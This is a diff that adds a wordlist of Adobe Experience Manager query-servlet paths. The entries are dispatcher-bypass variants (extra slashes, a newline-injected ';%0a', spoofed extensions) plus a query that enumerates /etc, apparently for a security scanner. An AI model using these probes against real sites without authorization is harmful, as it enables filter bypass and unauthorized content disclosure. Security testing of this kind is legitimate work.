@@ -1,0 +1,13 @@
+/bin/wcm/search/gql.servlet.json
+///bin///wcm/search/gql.servlet.json
+///bin///wcm/search/gql.json
+///bin///wcm/search/gql.json/a.1.json
+///bin///wcm/search/gql.json;%0aa.css
+///bin///wcm/search/gql.json/a.css
+///bin///wcm/search/gql.json/a.ico
+///bin///wcm/search/gql.json/a.png
+///bin///wcm/search/gql.json/a.html
+/bin/wcm/search/gql.servlet.json?query=path:/etc%20type:base%20limit:..-1&pathPrefix=
+
+
+
